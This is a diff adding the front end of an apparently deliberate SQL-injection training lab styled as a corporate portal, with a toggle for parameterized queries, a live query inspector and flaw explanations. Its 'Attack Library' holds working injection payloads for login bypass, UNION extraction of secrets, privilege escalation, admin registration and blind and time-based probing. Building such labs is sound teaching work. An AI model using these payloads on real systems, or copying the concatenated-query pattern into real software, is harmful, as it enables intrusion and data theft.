@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GlobalTech Solutions | Corporate Portal</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body data-theme="light">
+    <!-- Sidebar -->
+    <aside>
+        <div class="brand-header">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+            GlobalTech
+        </div>
+        <nav class="nav-group">
+            <a href="#" class="nav-link active" data-page="home">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+                Dashboard
+            </a>
+            <a href="#" class="nav-link" data-page="staff">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                Staff Portal
+            </a>
+            <a href="#" class="nav-link" data-page="directory">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2" ry="2"/><line x1="7" y1="8" x2="7" y2="8"/><line x1="7" y1="12" x2="7" y2="12"/><line x1="7" y1="16" x2="7" y2="16"/></svg>
+                Employee Search
+            </a>
+            <a href="#" class="nav-link" data-page="profile">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+                Profile Settings
+            </a>
+            <a href="#" class="nav-link" data-page="register">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg>
+                Self Registration
+            </a>
+            <a href="#" class="nav-link" data-page="sysadmin">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
+                System Utilities
+            </a>
+        </nav>
+        <div style="padding: 1.5rem; font-size: 0.75rem; color: #94a3b8; border-top: 1px solid rgba(255,255,255,0.1);">
+            &copy; 2026 GlobalTech Solutions Inc.
+        </div>
+    </aside>
+
+    <main>
+        <!-- Top Header -->
+        <header>
+            <div style="display: flex; align-items: center; gap: 1rem;">
+                <h1 id="page-title" style="font-size: 1.25rem; font-weight: 600;">Corporate Dashboard</h1>
+            </div>
+            <div class="header-actions">
+                <button class="lab-toggle-btn" id="toggle-toolbox">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 6px; vertical-align: middle;"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
+                    Researcher Toolbox
+                </button>
+                <div style="width: 32px; height: 32px; border-radius: 50%; background: #e2e8f0; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 0.8rem;">JD</div>
+            </div>
+        </header>
+
+        <!-- Main Content Wrapper -->
+        <div class="page-container">
+            <div class="real-page">
+                <!-- Home Page -->
+                <div id="home-page" class="page-content">
+                    <div class="card">
+                        <h2>Welcome back, Guest</h2>
+                        <p style="color: var(--text-muted); line-height: 1.6;">You are currently accessing the public GlobalTech Solutions portal. Some functionalities require staff authentication. Please use the Staff Portal link on the sidebar to log in.</p>
+                        <div style="margin-top: 2rem; display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem;">
+                            <div style="padding: 1.25rem; background: #eff6ff; border-radius: 8px; border: 1px solid #bfdbfe;">
+                                <h4 style="color: #1e40af; margin-bottom: 0.5rem;">Corporate Notice</h4>
+                                <p style="font-size: 0.85rem; color: #1e3a8a;">Mandatory database maintenance scheduled for Sunday at 02:00 AM UTC.</p>
+                            </div>
+                            <div style="padding: 1.25rem; background: #f0fdf4; border-radius: 8px; border: 1px solid #bbf7d0;">
+                                <h4 style="color: #166534; margin-bottom: 0.5rem;">System Health</h4>
+                                <p style="font-size: 0.85rem; color: #14532d;">All systems are currently operational. No major incidents reported in last 24h.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Staff Login Page -->
+                <div id="staff-page" class="page-content hidden">
+                    <div class="card" style="max-width: 450px; margin: 4rem auto;">
+                        <h2 style="text-align: center;">Staff Portal</h2>
+                        <p style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Please authenticate to access internal systems.</p>
+                        <div class="form-group">
+                            <label>Employee ID / Email</label>
+                            <input type="text" id="login-user" placeholder="e.g. j.doe@globaltech.com">
+                        </div>
+                        <div class="form-group">
+                            <label>Password</label>
+                            <input type="password" id="login-pass" placeholder="••••••••">
+                        </div>
+                        <button class="primary-btn" style="width: 100%;" id="login-btn">Log In</button>
+                        <div id="login-msg" style="margin-top: 1rem; text-align: center; font-size: 0.9rem;"></div>
+                    </div>
+                </div>
+
+                <!-- Employee Directory -->
+                <div id="directory-page" class="page-content hidden">
+                    <div class="card">
+                        <h2>Employee Directory</h2>
+                        <p style="color: var(--text-muted); margin-bottom: 1.5rem;">Search the GlobalTech internal directory to find contact information.</p>
+                        <div style="display: flex; gap: 1rem; margin-bottom: 2rem;">
+                            <input type="text" id="search-input" placeholder="Search by name, role or department..." style="flex-grow: 1;">
+                            <button class="primary-btn" id="search-btn">Search</button>
+                        </div>
+                        <div id="directory-results">
+                            <p style="text-align: center; padding: 3rem; color: var(--text-muted);">Enter a search term to begin.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Profile Settings -->
+                <div id="profile-page" class="page-content hidden">
+                    <div class="card" style="max-width: 500px; margin: 0 auto;">
+                        <h2>Profile Settings</h2>
+                        <p style="color: var(--text-muted); margin-bottom: 2rem;">Update your employee record details.</p>
+                        <div class="form-group">
+                            <label>Display Name (Internal ID)</label>
+                            <input type="text" id="profile-name" value="john_doe">
+                        </div>
+                        <div class="form-group">
+                            <label>Work Email</label>
+                            <input type="email" id="profile-email" value="john.d@globaltech.com">
+                        </div>
+                        <button class="primary-btn" style="width: 100%;" id="profile-save-btn">Save Changes</button>
+                        <div id="profile-msg" style="margin-top: 1rem; text-align: center;"></div>
+                    </div>
+                </div>
+
+                <!-- Registration Page -->
+                <div id="register-page" class="page-content hidden">
+                    <div class="card" style="max-width: 500px; margin: 0 auto;">
+                        <h2>Employee Onboarding</h2>
+                        <p style="color: var(--text-muted); margin-bottom: 2rem;">Create a new restricted access employee account.</p>
+                        <div class="form-group">
+                            <label>New Username</label>
+                            <input type="text" id="reg-user" placeholder="e.g. b.wayne">
+                        </div>
+                        <div class="form-group">
+                            <label>Initial Password</label>
+                            <input type="password" id="reg-pass" placeholder="••••••••">
+                        </div>
+                        <div class="form-group">
+                            <label>Primary Email</label>
+                            <input type="email" id="reg-email" placeholder="e.g. b.wayne@globaltech.com">
+                        </div>
+                        <button class="primary-btn" style="width: 100%;" id="register-btn">Submit Application</button>
+                        <div id="register-msg" style="margin-top: 1rem; text-align: center;"></div>
+                    </div>
+                </div>
+
+                <!-- System Utilities -->
+                <div id="sysadmin-page" class="page-content hidden">
+                    <div class="card">
+                        <h2>Infrastructure Utilities</h2>
+                        <p style="color: var(--text-muted); margin-bottom: 2rem;">Advanced diagnostic tools for system administrators.</p>
+                        
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
+                            <div>
+                                <h4>Account Health Check</h4>
+                                <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 1rem;">Verify if a specific service account is active.</p>
+                                <div style="display: flex; gap: 0.5rem;">
+                                    <input type="text" id="blind-input" placeholder="Service Username">
+                                    <button class="primary-btn" id="blind-btn" style="white-space: nowrap;">Verify</button>
+                                </div>
+                                <div id="blind-msg" style="margin-top: 1rem; font-weight: 600; font-size: 0.9rem;"></div>
+                            </div>
+                            <div>
+                                <h4>Latency Diagnostic</h4>
+                                <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 1rem;">Ping external gateways via internal ID.</p>
+                                <div style="display: flex; gap: 0.5rem;">
+                                    <input type="text" id="time-input" placeholder="Gateway ID">
+                                    <button class="primary-btn" id="time-btn">Ping</button>
+                                </div>
+                                <div id="time-msg" style="margin-top: 1rem; font-size: 0.9rem;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Researcher Toolbox (Floating) -->
+    <div id="researcher-panel">
+        <div class="panel-header">
+            <span style="font-weight: 700; font-size: 0.8rem; letter-spacing: 1px;">VULNERABILITY LAB CONTROLS</span>
+            <button id="close-panel" style="background: none; border: none; color: white; cursor: pointer;">&times;</button>
+        </div>
+        <div class="panel-content">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem;">
+                <span style="font-size: 0.85rem; font-weight: 600;">Parameterized Shield</span>
+                <label class="switch" style="position: relative; display: inline-block; width: 44px; height: 22px;">
+                    <input type="checkbox" id="security-toggle" style="opacity: 0; width: 0; height: 0;">
+                    <span class="slider" style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #475569; transition: .4s; border-radius: 20px;"></span>
+                </label>
+            </div>
+            
+            <div class="panel-title" style="font-size: 0.7rem; color: #94a3b8; margin-bottom: 0.5rem; text-transform: uppercase;">Vulnerability Analysis</div>
+            <div id="vulnerability-desc" style="font-size: 0.85rem; line-height: 1.5; color: #cbd5e1; background: rgba(255,255,255,0.05); padding: 0.75rem; border-radius: 6px; margin-bottom: 1rem;">
+                <!-- Description here -->
+            </div>
+
+            <div class="panel-title" style="font-size: 0.7rem; color: #94a3b8; margin-bottom: 0.5rem; text-transform: uppercase;">Real-time Query Inspector</div>
+            <div class="query-box" id="query-output">
+                <!-- Query here -->
+            </div>
+
+            <div class="panel-title" style="font-size: 0.7rem; color: #94a3b8; margin-bottom: 1rem; text-transform: uppercase;">Attack Library (Click to Inject)</div>
+            <div id="payload-list"></div>
+        </div>
+    </div>
+
+    <style>
+        /* Slider fix */
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #10b981; }
+        input:checked + .slider:before { transform: translateX(22px); }
+        .scanning { animation: pulse 1s infinite; color: #2563eb; font-weight: 600; }
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+    </style>
+
+    <script>
+        // State
+        let activePage = 'home';
+        let securityEnabled = false;
+
+        // Navigation
+        const navLinks = document.querySelectorAll('.nav-link');
+        const pages = document.querySelectorAll('.page-content');
+        const pageTitle = document.getElementById('page-title');
+
+        const pageNames = {
+            home: 'Corporate Dashboard',
+            staff: 'Employee Portal Access',
+            directory: 'Internal Directory Search',
+            profile: 'Employee Record Management',
+            register: 'Self-Service Onboarding',
+            sysadmin: 'System Infrastructure Utilities'
+        };
+
+        navLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                navLinks.forEach(l => l.classList.remove('active'));
+                link.classList.add('active');
+                
+                const pageId = link.dataset.page;
+                pages.forEach(p => p.classList.add('hidden'));
+                document.getElementById(`${pageId}-page`).classList.remove('hidden');
+                pageTitle.textContent = pageNames[pageId];
+                activePage = pageId;
+                updateQueryVisualizer();
+                updatePayloadLibrary();
+            });
+        });
+
+        // Toolbox Logic
+        const toolbox = document.getElementById('researcher-panel');
+        document.getElementById('toggle-toolbox').addEventListener('click', () => toolbox.style.display = 'block');
+        document.getElementById('close-panel').addEventListener('click', () => toolbox.style.display = 'none');
+
+        // Security Toggle
+        const securityToggle = document.getElementById('security-toggle');
+        securityToggle.addEventListener('change', async () => {
+            const res = await fetch('/api/config/toggle', { method: 'POST' });
+            const data = await res.json();
+            securityEnabled = data.securityEnabled;
+            updateQueryVisualizer();
+        });
+
+        // Vulnerability Explanations
+        const vulns = {
+            home: "<strong>No vulnerabilities.</strong> The dashboard is a static informative page.",
+            staff: "<strong>Auth Bypass:</strong> The login logic directly concatenates credentials. An attacker can use <code>' OR 1=1 --</code> to make the WHERE clause always TRUE, logging in without a password.",
+            directory: "<strong>UNION Injection:</strong> The search results are directly mapped to DB columns. Attackers can append <code>UNION SELECT</code> to 'join' results from other tables (like <code>secret_vault</code>) into the output.",
+            profile: "<strong>UPDATE Injection:</strong> The 'Update' query is vulnerable. An attacker can break out of the string and add additional assignments (e.g., <code>', role='admin</code>) to modify columns they shouldn't have access to.",
+            register: "<strong>INSERT Injection:</strong> The registration form is vulnerable. An attacker can inject extra values into the <code>INSERT</code> statement to bypass the default 'user' role and create an admin account.",
+            sysadmin: "<strong>Blind & Time-based SQLi:</strong> These are 'silent' vulnerabilities. Blind SQLi uses binary logic (True/False) to guess data. Time-based SQLi forces the DB to pause if a condition is met, leaking data via latency."
+        };
+
+        const queryOutput = document.getElementById('query-output');
+        const vulnDesc = document.getElementById('vulnerability-desc');
+
+        function updateQueryVisualizer() {
+            let u = document.getElementById('login-user').value;
+            let p = document.getElementById('login-pass').value;
+            let s = document.getElementById('search-input').value;
+            let b = document.getElementById('blind-input').value;
+            let t = document.getElementById('time-input').value;
+
+            vulnDesc.innerHTML = vulns[activePage];
+
+            const map = {
+                home: `<span style="color: #64748b">-- No active DB queries on Dashboard</span>`,
+                staff: securityEnabled 
+                    ? `SELECT * FROM users WHERE username = ? AND password = ?` 
+                    : `SELECT * FROM users WHERE username = <span style="color:#f43f5e">'${u}'</span> AND password = <span style="color:#f43f5e">'${p}'</span>`,
+                directory: securityEnabled
+                    ? `SELECT * FROM users WHERE username LIKE ?`
+                    : `SELECT * FROM users WHERE username LIKE <span style="color:#f43f5e">'%${s}%'</span>`,
+                profile: securityEnabled
+                    ? `UPDATE users SET username = ?, email = ? WHERE username = ?`
+                    : `UPDATE users SET username = <span style="color:#f43f5e">'${document.getElementById('profile-name').value}'</span>, email = <span style="color:#f43f5e">'${document.getElementById('profile-email').value}'</span> WHERE username = 'john_doe'`,
+                register: securityEnabled
+                    ? `INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, 'user')`
+                    : `INSERT INTO users (username, password, email, role) VALUES ('${document.getElementById('reg-user').value}', '...', <span style="color:#f43f5e">'${document.getElementById('reg-email').value}'</span>, 'user')`,
+                sysadmin: `<span style="color: #64748b">-- Active probing in progress...</span>`
+            };
+            queryOutput.innerHTML = map[activePage] || '--';
+        }
+
+        // Payloads (Integrated)
+        const payloadLibrary = {
+            home: [],
+            staff: [
+                { name: 'Authentication Bypass', code: "' OR 1=1 --" },
+                { name: 'Impersonate Admin', code: "admin' --" }
+            ],
+            directory: [
+                { name: 'Show All Records', code: "' OR 1=1 --" },
+                { name: 'Data Exfiltration (Secrets)', code: "' UNION SELECT id, secret_data, 'secret', 'secret' FROM secret_vault --" }
+            ],
+            profile: [
+                { name: 'Privilege Escalation', code: "john_doe', role='admin' --" },
+                { name: 'Bulk Reset Password', code: "hacker', password='pwned' --" }
+            ],
+            register: [
+                { name: 'Register as Admin', code: "test@gt.com', 'admin') --" }
+            ],
+            sysadmin: [
+                { name: 'Blind Boolean Probe', code: "admin' AND 1=1 --" },
+                { name: 'Time-based Trigger', code: "1' AND (SELECT count(*) FROM sqlite_master CROSS JOIN sqlite_master CROSS JOIN sqlite_master) > 0 --" }
+            ]
+        };
+
+        function updatePayloadLibrary() {
+            const list = document.getElementById('payload-list');
+            list.innerHTML = '';
+            if (!payloadLibrary[activePage]) return;
+            payloadLibrary[activePage].forEach(p => {
+                const div = document.createElement('div');
+                div.className = 'payload-pill';
+                div.textContent = p.name;
+                div.onclick = () => {
+                    const page = document.getElementById(`${activePage}-page`);
+                    const input = page.querySelector('input');
+                    if (input) {
+                        input.value = p.code;
+                        input.dispatchEvent(new Event('input'));
+                    }
+                };
+                list.appendChild(div);
+            });
+        }
+
+        // Module Interactions
+        document.getElementById('login-btn').addEventListener('click', async () => {
+            const username = document.getElementById('login-user').value;
+            const password = document.getElementById('login-pass').value;
+            const msg = document.getElementById('login-msg');
+            msg.innerHTML = '<span class="scanning">Authenticating...</span>';
+            
+            const res = await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password })
+            });
+            const data = await res.json();
+            msg.innerHTML = data.success ? `<span style="color:#10b981">Welcome, ${data.user.username}</span>` : `<span style="color:#f43f5e">Invalid Employee ID or Password</span>`;
+        });
+
+        document.getElementById('search-btn').addEventListener('click', async () => {
+            const q = document.getElementById('search-input').value;
+            const container = document.getElementById('directory-results');
+            container.innerHTML = '<p class="scanning" style="text-align:center; padding: 2rem;">Searching Employee DB...</p>';
+            
+            const res = await fetch(`/api/search?q=${encodeURIComponent(q)}`);
+            const data = await res.json();
+            
+            if (data.error) {
+                container.innerHTML = `<div style="color:#f43f5e; background: rgba(244, 63, 94, 0.05); padding: 1.5rem; border: 1px solid #fecaca; border-radius: 8px; font-family: monospace; font-size: 0.85rem;">
+                    SYSTEM_ERROR: Database exception while processing request.<br>Detail: ${data.detail}
+                </div>`;
+                return;
+            }
+
+            if (data.results && data.results.length > 0) {
+                let html = '<table style="width:100%; border-collapse: collapse;"><thead><tr style="border-bottom: 1px solid var(--border);"><th style="text-align:left; padding: 1rem; color: var(--text-muted); font-size: 0.8rem;">EMPLOYEE ID</th><th style="text-align:left; padding: 1rem; color: var(--text-muted); font-size: 0.8rem;">NAME</th><th style="text-align:left; padding: 1rem; color: var(--text-muted); font-size: 0.8rem;">DEPARTMENT</th><th style="text-align:left; padding: 1rem; color: var(--text-muted); font-size: 0.8rem;">CONTACT</th></tr></thead><tbody>';
+                data.results.forEach(r => {
+                    html += `<tr style="border-bottom: 1px solid var(--border);"><td style="padding: 1rem; font-size: 0.9rem;">#${r.id}</td><td style="padding: 1rem; font-size: 0.9rem; font-weight: 500;">${r.username || r.secret_data}</td><td style="padding: 1rem; font-size: 0.9rem;">${r.role || 'Internal'}</td><td style="padding: 1rem; font-size: 0.85rem; color: var(--brand-primary);">${r.email || 'N/A'}</td></tr>`;
+                });
+                html += '</tbody></table>';
+                container.innerHTML = html;
+            } else {
+                container.innerHTML = '<p style="text-align:center; padding: 3rem; color: var(--text-muted);">No employees found matching the criteria.</p>';
+            }
+        });
+
+        document.getElementById('blind-btn').addEventListener('click', async () => {
+            const u = document.getElementById('blind-input').value;
+            const msg = document.getElementById('blind-msg');
+            msg.innerHTML = '<span class="scanning">Verifying...</span>';
+            const res = await fetch(`/api/blind-check?username=${encodeURIComponent(u)}`);
+            const data = await res.json();
+            msg.innerHTML = data.exists ? '<span style="color:#10b981">SERVICE STATUS: ACTIVE</span>' : '<span style="color:#64748b">SERVICE STATUS: NOT FOUND</span>';
+        });
+
+        document.getElementById('time-btn').addEventListener('click', async () => {
+            const id = document.getElementById('time-input').value;
+            const msg = document.getElementById('time-msg');
+            msg.innerHTML = '<span class="scanning">Pinging Gateway...</span>';
+            const start = Date.now();
+            const res = await fetch(`/api/ping?id=${encodeURIComponent(id)}`);
+            const duration = Date.now() - start;
+            msg.innerHTML = `Round Trip Time: <span style="font-weight:700; color:${duration > 1000 ? '#f43f5e' : '#10b981'}">${duration}ms</span>`;
+        });
+
+        document.getElementById('profile-save-btn').addEventListener('click', async () => {
+            const displayName = document.getElementById('profile-name').value;
+            const email = document.getElementById('profile-email').value;
+            const msg = document.getElementById('profile-msg');
+            msg.innerHTML = '<span class="scanning">Updating Record...</span>';
+            
+            const res = await fetch('/api/profile/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: 'john_doe', displayName, email })
+            });
+            const data = await res.json();
+            msg.innerHTML = data.success ? '<span style="color:#10b981">Profile Updated Successfully</span>' : '<span style="color:#f43f5e">Update Failed</span>';
+        });
+
+        document.getElementById('register-btn').addEventListener('click', async () => {
+            const username = document.getElementById('reg-user').value;
+            const password = document.getElementById('reg-pass').value;
+            const email = document.getElementById('reg-email').value;
+            const msg = document.getElementById('register-msg');
+            msg.innerHTML = '<span class="scanning">Processing Application...</span>';
+            
+            const res = await fetch('/api/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, password, email })
+            });
+            const data = await res.json();
+            msg.innerHTML = data.success ? '<span style="color:#10b981">Account Created Successfully</span>' : '<span style="color:#f43f5e">Registration Denied</span>';
+        });
+
+        // Event listeners for visualizer
+        document.querySelectorAll('input').forEach(input => input.addEventListener('input', updateQueryVisualizer));
+
+        // Init
+        updateQueryVisualizer();
+        updatePayloadLibrary();
+    </script>
+</body>
+</html>
